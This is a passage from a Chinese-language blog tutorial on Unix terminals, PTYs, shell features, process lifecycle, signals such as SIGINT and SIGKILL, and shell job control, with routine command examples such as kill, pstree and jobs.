title="◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”"></a>◇从“【内核态】终端模拟器”到“【用户态】终端模拟器”</h3><p>　　在上一个章节中，emulator 运行在系统内核中，因此是“内核态模拟器”；<br>　　等到后来搞“伪终端”的时候，就直接把这个玩意儿从【内核态】转到【用户态】——让它直接运行在【桌面环境】。如此一来，用户就可以直接在桌面环境中使用“终端模拟器”。<br>　　当“终端模拟器”变为【用户态】，它就【无法】直接与“键盘驱动 or 显卡驱动”打交道。在这种情况下，由“GUI 系统”（比如：X11）负责与这些驱动打交道，然后再把用户的输入输出转交给“终端模拟器”。</p><p>　　下面这张示意图是 <a href="https://en.wikipedia.org/wiki/Xterm">xterm</a>。别看它长得丑，它的出现也算是“里程碑”了。</p><p><img src="https://lh5.googleusercontent.com/2GRHQZetZPor718nRQB0D4JPscPyssaw4c2ufUOa-EF73PWb-SmTFNJYjILwZ5znmpzX6qEdHrT5-1R83TmZAKUVzr4IhfdRMYmpZQmZC16qqIcaaJOESrJUX798-qtrtUSIE9lEUH4" alt="不见图 请翻墙"><br>（xterm——“图形化终端模拟器”的祖师爷）</p><h3 id="◇内部结构示意图-1"><a href="#◇内部结构示意图-1" class="headerlink" title="◇内部结构示意图"></a>◇内部结构示意图</h3><p>　　很多人把“emulator”与“PTY”混为一谈。实际上两者处于【不同】层次。<br>　　在操作系统内部（内核），PTY 分为两部分实现，分别叫做“PTY master” ＆ “PTY slave”。master 负责与“terminal emulator”打交道；而用户通过 emulator 里面的 shell 启动的其它进程，则与 slave 打交道。<br>　　在这个环节中，“PTY slave”又进一步缩写为“PTS”。如果你用 <code>ps</code> 命令查看系统中的所有进程，经常会看到 PTS 之类的字样，指的就是这个玩意儿。对普通用户而言，看到的是“终端模拟器”的界面，至于 PTY 内部的 master ＆ slave，通常是感觉不到滴。</p><p>　　为了让大伙儿更加直观，再放一张 PTY 的结构示意图。</p><p><img src="https://lh6.googleusercontent.com/58f8TOJpw7rR6_oGBLI9nVPiW1jBVddKBH30UTzWL3n8pyY4RSvF19SAJK-lkymlteMNeyffOHDXOXKYnHehTF2-2Hep1Q4bhwBTHdDkax3uDy1kR-3a75DvxvH-LD2ggRTXUojHmy4" alt="不见图 请翻墙"><br>（TTY 示意图3：【伪终端】的内部结构图）</p><h2 id="★shell——命令行解释器"><a href="#★shell——命令行解释器" class="headerlink" title="★shell——命令行解释器"></a>★shell——命令行解释器</h2><p>　　费了好多口水，咱们终于聊到 shell 了。<br>　　顺便吐槽一下：<br>　　扫盲命令行的教程，很少会像俺这样，从最基本的概念说起。其导致的后果就是——很多人（甚至包括很多 Linux 程序员）都搞不清“shell、terminal、console、TTY、PTY、PTS”这些概念到底有啥区别。<br>　　在《<a href="https://program-think.blogspot.com/2019/10/Systematic-Learning.html">如何【系统性学习】——从“媒介形态”聊到“DIKW 模型”</a>》一文中，俺特别强调了【基本概念/基础知识】的重要性。这也就是俺为啥前面要费这么多口水的原因。</p><h3 id="◇shell-VS-terminal"><a href="#◇shell-VS-terminal" class="headerlink" title="◇shell VS terminal"></a>◇shell VS terminal</h3><p>　　前面所说的“终端”（terminal），本质上是：<strong>基于【文本】的输入输出机制</strong>。它并【不】理解具体的命令及其语法。<br>　　于是就需要引入 shell 这个玩意儿——shell 负责解释你输入的命令，并根据你输入的命令，执行某些动作（包括：启动其它进程）。</p><h3 id="◇常见-shell-举例"><a href="#◇常见-shell-举例" class="headerlink" title="◇常见 shell 举例"></a>◇常见 shell 举例</h3><p>　　常见的 shell 包括如下这些（为避免排名纠纷，按字母序列出）：</p><blockquote><p>bash<br>csh<br>fish<br>ksh<br>zsh</p></blockquote><p>　　在维基百科的“<a href="https://en.wikipedia.org/wiki/Comparison_of_command_shells">这个页面</a>”，列出了各种各样的 shell 及其功能特性的对照表。<br>　　如今影响力最大的 shell 是 <a href="https://en.wikipedia.org/wiki/Bash_(Unix_shell)">bash</a>（没有之一）。其名称源自“Bourne-again shell”，是 GNU 社区对 <a href="https://en.wikipedia.org/wiki/Bourne_shell">Bourne shell</a> 的重写，使之符合自由软件（GPL 协议）。<br>　　本文后续章节对 shell 的举例，如果没有做特殊说明，均指 bash 这个 shell。</p><h2 id="★shell-的基本功能"><a href="#★shell-的基本功能" class="headerlink" title="★shell 的基本功能"></a>★shell 的基本功能</h2><h3 id="◇显示【命令行提示符】"><a href="#◇显示【命令行提示符】" class="headerlink" title="◇显示【命令行提示符】"></a>◇显示【命令行提示符】</h3><p>　　当你打开一个 shell，会看闪烁的光标左侧显示一个东东，那个玩意儿就是【命令行提示符】（参见下图）</p><p><img src="https://lh5.googleusercontent.com/q5gzYkmF9TWwGKHNRJKXgE2EhnVrHdCuKSb_bij_33qGNGlHgLCg-FUmFqTGG0ySOa2r7ftvwcW8H1p1CwnGt_9F9q1Kb2PeeZlACYUk5B540yV0AxoLDcfaeSjjT62NeuEGh2hlYi8" alt="不见图 请翻墙"><br>（截图中的“命令行提示符”包含了：用户名、当前路径、$分隔符）</p><p>　　很多 shell 的“命令行提示符”都会包含【当前路径】。当你用 <code>cd</code> 命令切换目录，提示符也会随之改变。这有助于你搞清楚当前在哪个目录下，<strong>可以有效避免误操作</strong>。<br>　　下面这张图演示了——“命令行提示符”随着当前目录的变化而变化。</p><p><img src="https://lh6.googleusercontent.com/RY0bVcLsYb8NFwMCu2XFeYEtaNopq9mI-XHZguPCFF7ojalynKSebm1LWVrENzZk_8msixbqyzGae8y5MxysSu2Q_GNl7N9l8AGt9ltXwsr5nUt-XWIuQH0l-scWPyO0qkm-y_D1oJs" alt="不见图 请翻墙"></p><p>　　大部分 shell 都可以让你自定义这个【命令行提示符】，使之显示更多的信息量。<br>　　比如说，可以让它显示：当前的时间、主机名、上一个命令的退出码……<br>　　（注：如果你需要开多个【远程】终端，去操作多个【不同】的系统，“主机名”就蛮有用）</p><h3 id="◇解析用户输入的【命令行】"><a href="#◇解析用户输入的【命令行】" class="headerlink" title="◇解析用户输入的【命令行】"></a>◇解析用户输入的【命令行】</h3><p>　　假设你想看一下 <code>/home</code> 这个目录下有哪些子目录，可以在 shell 中运行了如下命令：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> <span class="hljs-string">/home</span><br></code></pre></td></tr></table></figure><p>　　当你输入这串命令并敲回车键，shell 会拿到这一行，然后它会分析出，空格前面的 <code>ls</code> 是一个外部命令，空格后面的 <code>/home</code> 是该命令的参数。<br>　　然后 shell 会启动这个外部命令对应的进程，并把上述参数作为该进程的启动参数。</p><h3 id="◇内部命令-VS-外部命令"><a href="#◇内部命令-VS-外部命令" class="headerlink" title="◇内部命令 VS 外部命令"></a>◇内部命令 VS 外部命令</h3><p>　　（刚才提到了【外部命令】这个词汇，顺便解释一下）<br>　　通俗地说，“内部命令”就是内置在 shell 中的命令；而“外部命令”则对应了某个具体的【可执行文件】。<br>　　当你在 shell 中执行“外部命令”，shell 会启动对应的可执行文件，从而创建出一个“子进程”；而如果是“内部命令”，就【不】产生子进程。<br>　　那么，如何判断某个命令是否为“外部命令”捏？<br>　　比较简单的方法是——用如下方式来帮你查找。如果某个命令能找到对应的可执行文件，就是“外部命令”；反之则是“内部命令”。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">whereis</span> 命令名称<br></code></pre></td></tr></table></figure><h3 id="◇翻译【通配符】"><a href="#◇翻译【通配符】" class="headerlink" title="◇翻译【通配符】"></a>◇翻译【通配符】</h3><p>　　玩过命令行的同学，应该都知道：“星号”（<code>*</code>）与“问号”（<code>?</code>）可以作为通配符，用来模糊匹配文件名。<br>　　当你在 shell 中执行的命令包含了上述两个通配符，实际上是 shell 先把”通配符“翻译成具体的文件名，然后再传给相应命令。</p><h3 id="◇翻译某些【特殊符号】"><a href="#◇翻译某些【特殊符号】" class="headerlink" title="◇翻译某些【特殊符号】"></a>◇翻译某些【特殊符号】</h3><p>　　比如说：在 POSIX 系统中，通常用 <code>~</code> 来表示当前用户的【主目录】（home 目录）。<br>　　如果你在 shell 中用到了 <code>~</code> 这个符号，shell 会先把该符号翻译成“home 目录的【全路径】”，然后再传给相应命令。</p><h3 id="◇翻译【别名】"><a href="#◇翻译【别名】" class="headerlink" title="◇翻译【别名】"></a>◇翻译【别名】</h3><p>　　很多 POSIX 的 shell 都支持用 <code>alias</code> 命令设置别名（把一个较长的命令串，用一个较短的别名来表示）。<br>　　设置了别名之后，当你在 shell 中使用“别名”，由 shell 帮你翻译成原先的命令串。</p><p>　　举例：<br>俺使用如下命令创建了 <code>nc-tor</code> 这个别名。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">alias nc-tor=&#x27;nc -X 5 -x 127.0.0.1:<span class="hljs-number">9050</span>&#x27;<br></code></pre></td></tr></table></figure><p>　　设置完之后，当你在 shell 中执行了这个 <code>nc-tor</code> 命令，shell 会把它自动翻译成 <code>nc -X 5 -x 127.0.0.1:9050</code></p><h3 id="◇历史命令"><a href="#◇历史命令" class="headerlink" title="◇历史命令"></a>◇历史命令</h3><p>　　大部分 shell 都会记录历史命令。你可以使用某些设定的快捷键（通常是【向上】的方向键），重新运行之前执行过的命令。</p><h3 id="◇自动补全"><a href="#◇自动补全" class="headerlink" title="◇自动补全"></a>◇自动补全</h3><p>　　很多 shell 都具备自动补全的功能。<br>　　该功能不仅指“命令”本身的自动补全，还包括对“命令的参数”进行自动补全。</p><h3 id="◇操作“环境变量”"><a href="#◇操作“环境变量”" class="headerlink" title="◇操作“环境变量”"></a>◇操作“环境变量”</h3><p>　　关于这部分，在下面的“环境变量”章节单独聊。</p><h3 id="◇“管道”与“重定向”"><a href="#◇“管道”与“重定向”" class="headerlink" title="◇“管道”与“重定向”"></a>◇“管道”与“重定向”</h3><p>　　关于这部分，在下面的“管道”章节单独聊。</p><h3 id="◇“进程控制”与“作业控制”"><a href="#◇“进程控制”与“作业控制”" class="headerlink" title="◇“进程控制”与“作业控制”"></a>◇“进程控制”与“作业控制”</h3><p>　　关于这部分，在下面的“进程控制”与“作业控制”章节单独聊。</p><h2 id="★进程的启动与退出"><a href="#★进程的启动与退出" class="headerlink" title="★进程的启动与退出"></a>★进程的启动与退出</h2><h3 id="◇进程的【启动】及其【父子关系】"><a href="#◇进程的【启动】及其【父子关系】" class="headerlink" title="◇进程的【启动】及其【父子关系】"></a>◇进程的【启动】及其【父子关系】</h3><p>　　一般来说，每个“进程”都是由另一个进程启动滴。如果“进程A”创建了“进程B”，则 A 是【父进程】，B 是【子进程】（这个“父子关系”很好理解——因为完全符合直觉）<br>　　有些同学会问，那最早的【第一个】进程是谁启动滴？<br>　　一般来说，第一个进程由【操作系统内核】（kernel）亲自操刀运行起来；而 kernel 又是由“引导扇区”中的“boot loader”加载。</p><h3 id="◇进程树"><a href="#◇进程树" class="headerlink" title="◇进程树"></a>◇进程树</h3><p>　　在 POSIX 系统（Linux ＆ UNIX），所有的进程构成一个【单根树】的层次关系。进程之间的“父子关系”，体现在“进程树”就是树上的【父子节点】。<br>　　你可以使用如下命令，查看当前系统的“进程树”。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pstree</span><br></code></pre></td></tr></table></figure><p><img src="https://lh3.googleusercontent.com/oyi3HQTSxSr8Jyov0B1gGtwvQrjuWsScmpmZamLS8KfpLAIUzUZ5AaZem5fcOnYsAGewJoVKviqGMirk8QVRFfPFC3YYe-Dbh_-czN3M0M_HHgOQh0BvxrGMVPnj6g4wrlmiJZwPVBM" alt="不见图 请翻墙"><br>（“进程树”的效果图。注：为了避免暴露俺的系统信息，特意【不】用自己系统的截图）</p><h3 id="◇初始进程"><a href="#◇初始进程" class="headerlink" title="◇初始进程"></a>◇初始进程</h3><p>　　一般情况下，POSIX 系统的“进程树”的【根节点】就是系统开机之后【第一个】创建的进程，并且其进程编号（PID）通常是 1。这个进程称之为“初始进程”。<br>　　（注：上述这句话并【不够】严密——因为某些 UNIX 衍生系统的“进程树”，位于根节点的进程【不是】“初始化进程”。这种情况与本文的主题没太大关系，俺不打算展开讨论）<br>　　对于“大部分 UNIX 衍生系统”以及“2010年之前的 Linux 发行版”，系统中的“初始进程”名叫 <code>init</code>；<br>　　如今越来越多的 Linux 发行版采用 <a href="https://en.wikipedia.org/wiki/Systemd">systemd</a> 来完成系统引导之后的初始化工作。在这些发行版中，“初始进程”名叫 <code>systemd</code>。</p><p>　　你可以用如下命令显示“进程树”中每个节点的“进程编号”（PID），然后就能看到编号为 1 的“初始进程”。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pstree -p</span><br></code></pre></td></tr></table></figure><h3 id="◇进程的三种死法"><a href="#◇进程的三种死法" class="headerlink" title="◇进程的三种死法"></a>◇进程的三种死法</h3><p>　　关于进程如何死亡，大致有如下三种情况：</p><p><strong>自然死亡</strong><br>　　如果某个进程把它该干的事情都干完了，自然就会退出。<br>　　这种是最常见的情况，也是最优雅的死法。俺习惯称作【自然死亡】。</p><p><strong>自杀</strong><br>　　如果某个进程的工作干到半当中，突然收到某个通知，让它立即退出。<br>　　这时候，进程会赶紧处理一些善后工作，然后自行了断——这就是【自杀】。</p><p><strong>它杀</strong><br>　　比“自杀”更粗暴的方式称之为【它杀】。也就是让“操作系统内核”直接把进程干掉。<br>　　在这种情况下，进程【不会】收到任何通知，因此也【不】可能进行任何善后事宜。</p><p>　　（注：上述三种死法纯属比喻，以加深大伙儿的印象；不必太较真。十年前俺刚开博客，写过几篇帖子谈“<a href="https://program-think.blogspot.com/2009/02/cxx-object-destroy-overview.html">C++ 对象之死</a>”，也用过类似比喻）<br>　　关于“自杀＆它杀”的方式，会涉及到【信号】。在下一个章节，俺会单独讨论【进程控制】，并会详细介绍“信号”的机制。</p><h3 id="◇“孤儿进程”及其“领养”"><a href="#◇“孤儿进程”及其“领养”" class="headerlink" title="◇“孤儿进程”及其“领养”"></a>◇“孤儿进程”及其“领养”</h3><p>　　如果某个进程死了（退出了），而它的子进程还【没】死，那么这些子进程就被形象地称之为“孤儿”，然后会被上述提到的【初始进程】“领养”——“初始进程”作为“孤儿进程”的父进程。<br>　　对应到“进程树”——“孤儿进程”会被重新调整到“进程树根节点”的【直接下级】。</p><h2 id="★“进程控制”与“信号”"><a href="#★“进程控制”与“信号”" class="headerlink" title="★“进程控制”与“信号”"></a>★“进程控制”与“信号”</h2><h3 id="◇用【Ctrl-C】杀进程"><a href="#◇用【Ctrl-C】杀进程" class="headerlink" title="◇用【Ctrl + C】杀进程"></a>◇用【Ctrl + C】杀进程</h3><p>　　为了演示这个效果，你可以执行如下命令：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ping</span> <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>　　如果是 Windows 系统里的 <code>ping</code> 命令，它只会进行4次“乒操作”，然后就自己退出了；<br>　　但对于 POSIX 系统里面的 <code>ping</code> 命令，它会永远运行下去（直到被杀掉）。<br>　　当 ping 在运行的时候，只要你按下 <code>Ctrl + C</code> 这个组合键，就可以立即终止这个 <code>ping</code> 进程。</p><h3 id="◇“Ctrl-C”背后的原理——【信号】（signal）"><a href="#◇“Ctrl-C”背后的原理——【信号】（signal）" class="headerlink" title="◇“Ctrl + C”背后的原理——【信号】（signal）"></a>◇“Ctrl + C”背后的原理——【信号】（signal）</h3><p>　　当你按下了 <code>Ctrl + C</code> 这个组合键，当前正在执行的进程会收到一个叫做【SIGINT】的信号。<br>　　如果进程内部定义了针对该信号的处理函数，那么就会去执行这个函数，完成该函数定义的一些动作。一般而言，该函数会进行一些善后工作，然后进程退出。<br>　　如果进程【没有】定义相应的处理函数，则会执行一个【默认动作】。对于 SIGINT 这个信号而言，默认动作就是“进程退出”。<br>　　上述这2种情况，都属于前面所说的自杀。这2种属于【常规情况】。</p><p>　　下面再来说【特殊情况】——有时候 <code>Ctrl + C</code>【无法】让进程退出。为啥会这样捏？<br>　　假如说，编写某个进程的程序员，定义了该信号的处理函数，但在这个函数内部，并【没有】执行“进程退出”这个动作。那么当该进程收到 SIGINT 信号之后，自然就【不会】退出。这种情况称之为——<strong>信号被该进程【屏蔽】了</strong>。</p><h3 id="◇【谁】发出“Ctrl-C”对应的信号？"><a href="#◇【谁】发出“Ctrl-C”对应的信号？" class="headerlink" title="◇【谁】发出“Ctrl + C”对应的信号？"></a>◇【谁】发出“Ctrl + C”对应的信号？</h3><p>　　很多人（包括很多玩命令行的老手）都有一个【误解】——他们误以为是 shell 发送了 SIGINT 信号给当前进程。<strong>其实不然！</strong><br>　　在上述 ping 的例子中，当 ping 进程在持续运行之时，你的键盘输入是关联到 ping 进程的“标准输入”（stdin）。在这种情况下，shell 根本【无法】获取你的按键信息。<br>　　实际上，是【终端】获取了你的 <code>Ctrl + C</code> 组合键信息，并发送了 SIGINT 信号。因为【终端】处于更底层，它负责承载你所有的输入输出。因此，它当然可以截获用户的某个特殊的组合键（比如：<code>Ctrl + C</code>），并执行某些特定的动作。<br>　　聊到这里，大伙儿会发现——<br>如果没有正确理解“终端”与“shell”这两者的关系，就会犯很多错误（造成很多误解）。</p><p>　　有的读者可能会问：“终端”如何知道【当前进程】是哪一个？（能想到这点，通常是比较爱思考滴）<br>　　俺来解答一下：<br>　　当 shell 启动了某个进程，它当然可以拿到这个进程的编号（pid），于是 shell 会调用某个系统 API（比如 <code>tcsetpgrp</code>）把“进程编号”与 shell 所属的“终端”关联起来。<br>　　当“终端”需要发送 SIGINT 信号时，再调用另一个系统 API（比如 <code>tcgetpgrp</code>），就可以知道当前进程的编号。</p><h3 id="◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL"><a href="#◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL" class="headerlink" title="◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL"></a>◇对比杀进程的几个信号：SIGINT、SIGTERM、SIGQUIT、SIGKILL</h3><p><strong>SIGINT</strong><br>　　在大部分 POSIX 系统的各种终端上，<code>Ctrl + C</code> 组合键触发的就是这个信号。<br>　　通常情况下，进程收到这个信号后，做完相关的善后工作，就自行了断（自杀）。</p><p><strong>SIGTERM</strong><br>　　这个信号基本类似于 SIGINT。<br>　　它是 <code>kill</code> ＆ <code>killall</code> 这两个命令【默认】使用的信号。<br>　　也就是说，当你用这俩命令杀进程，并且【没有】指定信号类型，那么 <code>kill</code> 或 <code>killall</code> 用的就是这个 SIGTERM 信号。</p><p><strong>SIGQUIT</strong><br>　　这个信号类似于前两个（SIGINT ＆ SIGINT），差别在于——进程在退出前会执行“<a href="https://en.wikipedia.org/wiki/Core_dump">core dump</a>”操作。<br>　　一般而言，只有程序员才会去关心“core dump”这个玩意儿，所以这里就不细聊了。</p><p><strong>SIGKILL</strong><br>　　在杀进程的几个信号中，这个信号是是最牛逼的（也是最粗暴的）。<br>　　前面三个信号都是【可屏蔽】滴，而这个信号是【不可屏蔽】滴。<br>　　当某个进程收到了【SIGKILL】信号，该进程自己【完全没有】处理信号的机会，而是由操作系统内核直接把这个进程干掉。<br>　　此种行为可以形象地称之为“它杀”。<br>　　当你用下列这些命令杀进程，本质上就是在发送这个信号进行【它杀】。【SIGKILL】这个信号的编号是 <code>9</code>，下列这些命令中的 <code>-9</code> 参数就是这么来滴。</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span> 进程号<br><span class="hljs-keyword">kill</span> -<span class="hljs-keyword">KILL</span> 进程号<br><br>killall -<span class="hljs-number">9</span> 进程名称<br>killall -<span class="hljs-keyword">KILL</span> 进程名称<br>killall -SIGKILL 进程名称<br></code></pre></td></tr></table></figure><p>　　为了方便对照上述这4种，俺放一个表格如下：</p><table><thead><tr><th>信号名称</th><th>编号</th><th>能否屏蔽</th><th>默认动作</th><th>俗称</th></tr></thead><tbody><tr><td>SIGINT</td><td>2</td><td>YES</td><td>进程自己退出</td><td>自杀</td></tr><tr><td>SIGTERM</td><td>15</td><td>YES</td><td>进程自己退出</td><td>自杀</td></tr><tr><td>SIGQUIT</td><td>3</td><td>YES</td><td>执行 core dump 进程自己退出</td><td>自杀</td></tr><tr><td>SIGKILL</td><td>9</td><td>NO</td><td>进程被内核干掉</td><td>它杀</td></tr></tbody></table><h3 id="◇【它杀】的危险性与副作用"><a href="#◇【它杀】的危险性与副作用" class="headerlink" title="◇【它杀】的危险性与副作用"></a>◇【它杀】的危险性与副作用</h3><p>　　请注意：<strong>【它杀】是一种比较危险的做法，可能导致一些【副作用】。</strong>只有当你用其它各种方式都无法干掉某个进程，才考虑用这招。<br>　　有读者在评论区问到了“它杀的副作用”，俺简单解释一下：<br>　　一方面，当操作系统用这种方式杀掉某个进程，虽然可以把很多内存相关的资源释放掉，但【内存之外】的资源，内核就管不了啦；另一方面，由于进程遭遇“它杀”，无法完成某些善后工作。<br>　　基于上述两点，就【有可能】会产生副作用。另外，“副作用的严重程度”取决于不同类型的软件。无法一概而论。</p><p><strong>举例1：</strong><br>　　某个进程正在保存文件。这时候遭遇“它杀”可能会导致文件损坏。<br>　　（注：虽然某些操作系统能做到“写操作的原子性”，但数据存储可能会涉及多个写操作。当进程在作【多个】关键性写操作时，遭遇它杀。可能导致数据文件【逻辑上】的损坏）</p><p><strong>举例2：</strong><br>　　还有更复杂的情况，比如涉及跨主机的网络通讯。某个进程可能向【远程】的某个网络服务分配了某个远程的资源，当进程“自然死亡 or 自杀”，它会在“善后工作”释放这个资源；而如果死于内核的“它杀”，这个远程的资源就【没】释放。</p><h3 id="◇kill-VS-killall"><a href="#◇kill-VS-killall" class="headerlink" title="◇kill VS killall"></a>◇kill VS killall</h3><p>　　这两个的差别在于——前者用“进程号”，后者用”进程名“（也就是可执行文件名）。<br>　　对于新手而言，<br>如果用 <code>kill</code> 命令，你需要先用 <code>ps</code> 命令打印出当前进程清单，然后找到你要杀的进程的编号；而如果要用 <code>killall</code> 命令，就比较省事（比较傻瓜化）。但万一碰到有多个【同名】进程在运行，而你只想干掉其中一个，那么就得老老实实用 <code>kill</code> 了。</p><h3 id="◇进程退出码"><a href="#◇进程退出码" class="headerlink" title="◇进程退出码"></a>◇进程退出码</h3><p>　　任何一个进程退出的时候，都对应某个【整数类型】的“退出码”。<br>　　按照 POSIX 系统（UNIX ＆ Linux）的传统惯例——<br>当“退出码”为【零】，表示“成功 or 正常状态”；<br>当“退出码”【非零】，表示“失败 or 异常状态”。</p><h3 id="◇暂停进程"><a href="#◇暂停进程" class="headerlink" title="◇暂停进程"></a>◇暂停进程</h3><p>　　刚才聊“杀进程”的时候提到了“自杀 VS 它杀”。前者比较“温柔”；而后者比较“粗暴”。<br>　　对于暂停进程，也有“温柔 ＆ 野蛮”两种玩法。而且也是用 <code>kill</code> 命令发信号。</p><p><strong>【温柔】式暂停（SIGTSTP）</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">kill</span> -<span class="hljs-keyword">TSTP</span> 进程编号<br></code></pre></td></tr></table></figure><p>　　这个【SIGTSTP】信号类似前面提及的【SIGINT】——<br>\1. 两者默认都绑定到组合键（【SIGINT】默认绑定到组合键【<code>Ctrl + C</code>】；【SIGTSTP】默认绑定到组合键【<code>Ctrl + Z</code>】）<br>\2. 这两个快捷键都是由【终端】截获，并发出相应的信号（具体原理参见本章节的某个小节）<br>\3. 两者都是【可】屏蔽的信号。也就是说，如果某个进程屏蔽了【SIGTSTP】信号，你就【无法】用该方式暂停它。这时候你就得改用【粗暴】的方式（如下）。</p><p><strong>【粗暴】式暂停（SIGSTOP）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -STOP 进程编号<br></code></pre></td></tr></table></figure><p>　　这个【SIGSTOP】信号与前面提及的【SIGKILL】有某种相同之处——这两个信号都属于【不可屏蔽】的信号。也就是说，收到【SIGSTOP】信号的进程【无法】抗拒被暂停（suspend）的命运。</p><p>　　与“杀进程”的风格类似——当你想要暂停某进程，应该先尝试“温柔”的方法，搞不定再用“粗暴”的方法（套用咱们天朝的老话叫“先礼后兵”）。</p><h3 id="◇恢复进程"><a href="#◇恢复进程" class="headerlink" title="◇恢复进程"></a>◇恢复进程</h3><p>　　当你想要重新恢复（resume）被暂停的进程，就用如下命令（该命令发送信号【SIGCONT】）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -CONT 进程编号<br></code></pre></td></tr></table></figure><h3 id="◇引申阅读"><a href="#◇引申阅读" class="headerlink" title="◇引申阅读"></a>◇引申阅读</h3><p>　　除了前面几个小节提到的信号，POSIX 系统还支持其它一些信号，具体参见维基百科的“<a href="https://en.wikipedia.org/wiki/Signal_(IPC)">这个页面</a>”。</p><h2 id="★作业控制（job）"><a href="#★作业控制（job）" class="headerlink" title="★作业控制（job）"></a>★作业控制（job）</h2><p>　　聊完了“进程控制”，再来聊“作业控制”。<br>　　（注：这里所说的“作业”是从洋文 job 翻译过来滴）</p><h3 id="◇啥是“作业”？"><a href="#◇啥是“作业”？" class="headerlink" title="◇啥是“作业”？"></a>◇啥是“作业”？</h3><p>　　“作业”是 shell 相关的术语，用来表示【进程组】的概念（每个作业就是一组进程）。<br>　　比如说，当你用“管道符”把若干命令串起来执行，这几个命令对应的进程就被视作【一组】。<br>　　（注：“管道符”的用法，后面某个章节会介绍）</p><h3 id="◇同步执行（前台执行）-VS-异步执行（后台执行）"><a href="#◇同步执行（前台执行）-VS-异步执行（后台执行）" class="headerlink" title="◇同步执行（前台执行） VS 异步执行（后台执行）"></a>◇同步执行（前台执行） VS 异步执行（后台执行）</h3><p>　　大部分情况下，你在 shell 中执行的命令都是“同步执行”（或者叫“前台执行”）。对于这种方式，只有当命令运行完毕，你才会重新看到 shell 的“命令行提示符”。<br>　　如果你以“异步执行”的方式启动某个外部命令，在这个命令还没有执行完的时候，你就可以重新看到“命令行提示符”。</p><p>　　请注意：<br>　　对于【短】寿命的外部命令（耗时很短的外部命令），“同步/异步”两种方式其实【没】啥区别。比如 <code>ls</code> 命令通常很快就执行完毕，你就感觉不到上述两种方式的差异。<br>　　只有当你执行了某个【长】寿命的外部命令（其执行时间至少达到若干秒），上述这两种方式才会体现出差别。</p><p>　　到目前为止，本文之前聊的命令执行方式，都属于“同步执行”；如果想用【异步】，需要在整个命令的最末尾追加一个半角的 <code>&amp;</code> 符号。</p><p><strong>【同步】方式举例</strong><br>　　下列命令以【同步】的方式启动火狐浏览器，只有当你关闭了火狐，才会重新看到 shell 的命令行提示符。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">firefox</span><br></code></pre></td></tr></table></figure><p><strong>【异步】方式举例</strong><br>　　下列命令以【异步】的方式启动火狐浏览器。你刚敲完回车，就会重新看到 shell 的“命令行提示符”（此时火狐依然在运行）</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">firefox <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure><p>　　以“同步”方式启动的进程，称作“【前台】进程”；反之，以“异步”方式启动的进程，称作“【后台】进程”。</p><h3 id="◇“前台”切换到“后台”"><a href="#◇“前台”切换到“后台”" class="headerlink" title="◇“前台”切换到“后台”"></a>◇“前台”切换到“后台”</h3><p>　　假设当前的 shell 正在执行某个长寿命的【前台】进程，你可以按【<code>Ctrl + Z</code>】，就可以让该进程变为【后台】进程——此时你立即可以看到“命令提示符”。<br>　　只要你不是太健忘，应该记得前一个章节有提到过【<code>Ctrl + Z</code>】这个组合键——它用来实现”【温柔】式暂停“，其原理是：向目标进程发送【SIGTSTP】信号。</p><h3 id="◇“后台”切换到“前台”"><a href="#◇“后台”切换到“前台”" class="headerlink" title="◇“后台”切换到“前台”"></a>◇“后台”切换到“前台”</h3><p>　　假设当前 shell 正在执行某个后台进程。由于该进程在【后台】执行，此时有“命令提示符”，然后你在 shell 中执行 <code>fg</code> 命令，就可以把该后台进程切换到【前台】。</p><p>　　某些爱思考的同学会问了——如果同时启动了【多个】“后台进程”，<code>fg</code> 命令会切换哪一个捏？<br>　　在这种情况下，<code>fg</code> 命令切换的是【最后启动】的那个。</p><p>　　如果你有 N 个“后台进程”，你想把其中的某个切换为“前台进程”，这时候就需要用到 <code>jobs</code> 命令。该命令与乔布斯同名 :)<br>　　举例：<br>　　假设俺同时启动了 vim 与 emacs 作为后台进程，先用 <code>jobs</code> 命令列出所有的后台进程。假设该命令的输出是如下这个样子。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ jobs<br><span class="hljs-string">[1]</span>  running    vim<br><span class="hljs-string">[2]</span>  running    